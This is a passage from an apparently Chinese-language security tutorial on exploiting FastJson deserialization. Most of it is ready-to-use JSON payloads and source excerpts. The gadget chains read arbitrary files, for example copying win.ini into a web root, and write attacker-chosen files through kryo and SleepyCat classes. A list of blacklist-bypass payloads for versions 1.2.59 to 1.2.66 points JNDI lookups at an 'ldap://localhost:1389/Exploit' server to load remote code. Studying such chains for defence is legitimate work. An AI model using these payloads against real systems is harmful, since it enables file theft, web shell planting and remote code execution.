&lt;groupId&gt;org.aspectj&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">1.9</span><span class="number">.5</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>看下SafeFileOutputStream类的源码，其<code>SafeFileOutputStream(java.lang.String, java.lang.String)</code>构造函数判断了如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中，正是利用其构造函数的这个特点来实现Web场景下的 <strong>任意文件读取</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafeFileOutputStream</span> <span class="keyword">extends</span> <span class="title class_">OutputStream</span> &#123;  </span><br><span class="line">    <span class="keyword">protected</span> File temp;  </span><br><span class="line">    <span class="keyword">protected</span> File target;  </span><br><span class="line">    <span class="keyword">protected</span> OutputStream output;  </span><br><span class="line">    <span class="keyword">protected</span> <span class="type">boolean</span> failed;  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EXTENSION</span> <span class="operator">=</span> <span class="string">&quot;.bak&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SafeFileOutputStream</span><span class="params">(File file)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="built_in">this</span>(file.getAbsolutePath(), (String)<span class="literal">null</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 该构造函数判断如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SafeFileOutputStream</span><span class="params">(String targetPath, String tempPath)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="built_in">this</span>.failed = <span class="literal">false</span>;  </span><br><span class="line">        <span class="built_in">this</span>.target = <span class="keyword">new</span> <span class="title class_">File</span>(targetPath);  </span><br><span class="line">        <span class="built_in">this</span>.createTempFile(tempPath);  </span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.target.exists()) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.temp.exists()) &#123;  </span><br><span class="line">                <span class="built_in">this</span>.output = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="built_in">this</span>.target));  </span><br><span class="line">                <span class="keyword">return</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="built_in">this</span>.copy(<span class="built_in">this</span>.temp, <span class="built_in">this</span>.target);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="built_in">this</span>.output = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="built_in">this</span>.temp));  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.output.close();  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;  </span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;  </span><br><span class="line">            <span class="keyword">throw</span> var2;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.failed) &#123;  </span><br><span class="line">            <span class="built_in">this</span>.temp.delete();  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.commit();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">commit</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.temp.exists()) &#123;  </span><br><span class="line">            <span class="built_in">this</span>.target.delete();  </span><br><span class="line">            <span class="built_in">this</span>.copy(<span class="built_in">this</span>.temp, <span class="built_in">this</span>.target);  </span><br><span class="line">            <span class="built_in">this</span>.temp.delete();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">copy</span><span class="params">(File sourceFile, File destinationFile)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="keyword">if</span> (sourceFile.exists()) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (!sourceFile.renameTo(destinationFile)) &#123;  </span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">source</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">                <span class="type">BufferedOutputStream</span> <span class="variable">destination</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">try</span> &#123;  </span><br><span class="line">                    source = <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(sourceFile));  </span><br><span class="line">                    destination = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(destinationFile));  </span><br><span class="line">                    <span class="built_in">this</span>.transferStreams(source, destination);  </span><br><span class="line">                    destination.close();  </span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;  </span><br><span class="line">                    FileUtil.safeClose(source);  </span><br><span class="line">                    FileUtil.safeClose(destination);  </span><br><span class="line">                &#125;  </span><br><span class="line">  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">createTempFile</span><span class="params">(String tempPath)</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (tempPath == <span class="literal">null</span>) &#123;  </span><br><span class="line">            tempPath = <span class="built_in">this</span>.target.getAbsolutePath() + <span class="string">&quot;.bak&quot;</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="built_in">this</span>.temp = <span class="keyword">new</span> <span class="title class_">File</span>(tempPath);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flush</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.output.flush();  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;  </span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;  </span><br><span class="line">            <span class="keyword">throw</span> var2;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTempFilePath</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.temp.getAbsolutePath();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">transferStreams</span><span class="params">(InputStream source, OutputStream destination)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;  </span><br><span class="line">            <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> source.read(buffer);  </span><br><span class="line">            <span class="keyword">if</span> (bytesRead == -<span class="number">1</span>) &#123;  </span><br><span class="line">                <span class="keyword">return</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            destination.write(buffer, <span class="number">0</span>, bytesRead);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> b)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.output.write(b);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var3) &#123;  </span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;  </span><br><span class="line">            <span class="keyword">throw</span> var3;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POC:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;, &quot;tempPath&quot;:&quot;C:/Windows/win.ini&quot;, &quot;targetPath&quot;:&quot;D:/wamp64/www/win.txt&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h2><p>写内容类： <strong>com.esotericsoftware.kryo.io.Output</strong></p><p>依赖：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;kryo&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>Output类主要用来写内容，它提供了setBuffer()和setOutputStream()两个setter方法可以用来写入输入流，其中buffer参数值是文件内容，outputStream参数值就是前面的SafeFileOutputStream类对象，而要触发写文件操作则需要调用其flush()函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setOutputStream</span> <span class="params">(OutputStream outputStream)</span> &#123;  </span><br><span class="line"><span class="built_in">this</span>.outputStream = outputStream;  </span><br><span class="line">position = <span class="number">0</span>;  </span><br><span class="line">total = <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">...  </span><br><span class="line">  </span><br><span class="line"><span class="comment">/** Sets the buffer that will be written to. &#123;<span class="doctag">@link</span> #setBuffer(byte[], int)&#125; is called with the specified buffer&#x27;s length as the  </span></span><br><span class="line"><span class="comment"> * maxBufferSize. */</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBuffer</span> <span class="params">(<span class="type">byte</span>[] buffer)</span> &#123;  </span><br><span class="line">setBuffer(buffer, buffer.length);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">...  </span><br><span class="line">  </span><br><span class="line"><span class="comment">/** Writes the buffered bytes to the underlying OutputStream, if any. */</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flush</span> <span class="params">()</span> <span class="keyword">throws</span> KryoException &#123;  </span><br><span class="line"><span class="keyword">if</span> (outputStream == <span class="literal">null</span>) <span class="keyword">return</span>;  </span><br><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line">outputStream.write(buffer, <span class="number">0</span>, position);  </span><br><span class="line">outputStream.flush();  </span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException ex) &#123;  </span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">KryoException</span>(ex);  </span><br><span class="line">&#125;  </span><br><span class="line">total += position;  </span><br><span class="line">position = <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着，就是要看怎么触发Output类flush()函数了，flush()函数只有在close()和require()函数被调用时才会触发，其中require()函数在调用write相关函数时会被触发。</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/84.png"></p><p>其中，找到JDK的ObjectOutputStream类，其内部类BlockDataOutputStream的构造函数中将OutputStream类型参数赋值给out成员变量，而其setBlockDataMode()函数中调用了drain()函数、drain()函数中又调用了out.write()函数，满足前面的需求,：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">      BlockDataOutputStream(OutputStream out) &#123;  </span><br><span class="line">          <span class="built_in">this</span>.out = out;  </span><br><span class="line">          dout = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(<span class="built_in">this</span>);  </span><br><span class="line">      &#125;  </span><br><span class="line">  </span><br><span class="line">      <span class="comment">/**  </span></span><br><span class="line"><span class="comment">       * Sets block data mode to the given mode (true == on, false == off)  </span></span><br><span class="line"><span class="comment">       * and returns the previous mode value.  If the new mode is the same as  </span></span><br><span class="line"><span class="comment">       * the old mode, no action is taken.  If the new mode differs from the  </span></span><br><span class="line"><span class="comment">       * old mode, any buffered data is flushed before switching to the new  </span></span><br><span class="line"><span class="comment">       * mode.  </span></span><br><span class="line"><span class="comment">       */</span>  </span><br><span class="line">      <span class="type">boolean</span> <span class="title function_">setBlockDataMode</span><span class="params">(<span class="type">boolean</span> mode)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">          <span class="keyword">if</span> (blkmode == mode) &#123;  </span><br><span class="line">              <span class="keyword">return</span> blkmode;  </span><br><span class="line">          &#125;  </span><br><span class="line">          drain();  </span><br><span class="line">          blkmode = mode;  </span><br><span class="line">          <span class="keyword">return</span> !blkmode;  </span><br><span class="line">      &#125;  </span><br><span class="line">  </span><br><span class="line">...  </span><br><span class="line">  </span><br><span class="line">      <span class="comment">/**  </span></span><br><span class="line"><span class="comment">       * Writes all buffered data from this stream to the underlying stream,  </span></span><br><span class="line"><span class="comment">       * but does not flush underlying stream.  </span></span><br><span class="line"><span class="comment">       */</span>  </span><br><span class="line">      <span class="keyword">void</span> <span class="title function_">drain</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">          <span class="keyword">if</span> (pos == <span class="number">0</span>) &#123;  </span><br><span class="line">              <span class="keyword">return</span>;  </span><br><span class="line">          &#125;  </span><br><span class="line">          <span class="keyword">if</span> (blkmode) &#123;  </span><br><span class="line">              writeBlockHeader(pos);  </span><br><span class="line">          &#125;  </span><br><span class="line">          out.write(buf, <span class="number">0</span>, pos);  </span><br><span class="line">          pos = <span class="number">0</span>;  </span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>对于setBlockDataMode()函数的调用，在ObjectOutputStream类的有参构造函数中就存在：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectOutputStream</span><span class="params">(OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">    verifySubclass();  </span><br><span class="line">    bout = <span class="keyword">new</span> <span class="title class_">BlockDataOutputStream</span>(out);  </span><br><span class="line">    handles = <span class="keyword">new</span> <span class="title class_">HandleTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);  </span><br><span class="line">    subs = <span class="keyword">new</span> <span class="title class_">ReplaceTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);  </span><br><span class="line">    enableOverride = <span class="literal">false</span>;  </span><br><span class="line">    writeStreamHeader();  </span><br><span class="line">    bout.setBlockDataMode(<span class="literal">true</span>);  </span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;  </span><br><span class="line">        debugInfoStack = <span class="keyword">new</span> <span class="title class_">DebugTraceInfoStack</span>();  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        debugInfoStack = <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是Fastjson优先获取的是ObjectOutputStream类的无参构造函数，因此只能找ObjectOutputStream的继承类来触发了。</p><p>只有有参构造函数的ObjectOutputStream继承类：<strong>com.sleepycat.bind.serial.SerialOutput</strong></p><p>依赖：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;com.sleepycat&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;je&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">5.0</span><span class="number">.73</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>看到，SerialOutput类的构造函数中是调用了父类ObjectOutputStream的有参构造函数，这就满足了前面的条件了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SerialOutput</span><span class="params">(OutputStream out, ClassCatalog classCatalog)</span>  </span><br><span class="line">    <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">super</span>(out);  </span><br><span class="line">    <span class="built_in">this</span>.classCatalog = classCatalog;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* guarantee that we&#x27;ll always use the same serialization format */</span>  </span><br><span class="line">  </span><br><span class="line">    useProtocolVersion(ObjectStreamConstants.PROTOCOL_VERSION_2);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PoC如下，用到了Fastjson循环引用的技巧来调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;  </span><br><span class="line">    <span class="string">&quot;stream&quot;</span>: &#123;  </span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,  </span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span>,  </span><br><span class="line">        <span class="string">&quot;targetPath&quot;</span>: <span class="string">&quot;D:/wamp64/www/hacked.txt&quot;</span>,  </span><br><span class="line">        <span class="string">&quot;tempPath&quot;</span>: <span class="string">&quot;D:/wamp64/www/test.txt&quot;</span>  </span><br><span class="line">    &#125;,  </span><br><span class="line">    <span class="string">&quot;writer&quot;</span>: &#123;  </span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,  </span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span>,  </span><br><span class="line">        <span class="string">&quot;buffer&quot;</span>: <span class="string">&quot;cHduZWQ=&quot;</span>,  </span><br><span class="line">        <span class="string">&quot;outputStream&quot;</span>: &#123;  </span><br><span class="line">            <span class="string">&quot;$ref&quot;</span>: <span class="string">&quot;$.stream&quot;</span>  </span><br><span class="line">        &#125;,  </span><br><span class="line">        <span class="string">&quot;position&quot;</span>: <span class="number">5</span>  </span><br><span class="line">    &#125;,  </span><br><span class="line">    <span class="string">&quot;close&quot;</span>: &#123;  </span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,  </span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sleepycat.bind.serial.SerialOutput&quot;</span>,  </span><br><span class="line">        <span class="string">&quot;out&quot;</span>: &#123;  </span><br><span class="line">            <span class="string">&quot;$ref&quot;</span>: <span class="string">&quot;$.writer&quot;</span>  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="其他版本黑名单绕过Gadget"><a href="#其他版本黑名单绕过Gadget" class="headerlink" title="其他版本黑名单绕过Gadget"></a>其他版本黑名单绕过Gadget</h1><h2 id="1-2-59"><a href="#1-2-59" class="headerlink" title="1.2.59"></a>1.2.59</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;  </span><br><span class="line">或  </span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-61"><a href="#1-2-61" class="headerlink" title="1.2.61"></a>1.2.61</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span>,<span class="string">&quot;jndiName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>,<span class="string">&quot;Object&quot;</span>:<span class="string">&quot;a&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-62"><a href="#1-2-62" class="headerlink" title="1.2.62"></a>1.2.62</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;</span>, <span class="string">&quot;parameters&quot;</span>: &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.Hashtable&quot;</span>,<span class="string">&quot;java.naming.factory.initial&quot;</span>:<span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>,<span class="string">&quot;topic-factory&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;, <span class="string">&quot;namespace&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-66"><a href="#1-2-66" class="headerlink" title="1.2.66"></a>1.2.66</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span>, <span class="string">&quot;jndiNames&quot;</span>:[<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>], <span class="string">&quot;Realms&quot;</span>:[<span class="string">&quot;&quot;</span>]&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;  </span><br><span class="line">或  </span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="string">&quot;properties&quot;</span>: &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.Properties&quot;</span>,<span class="string">&quot;UserTransaction&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><h2 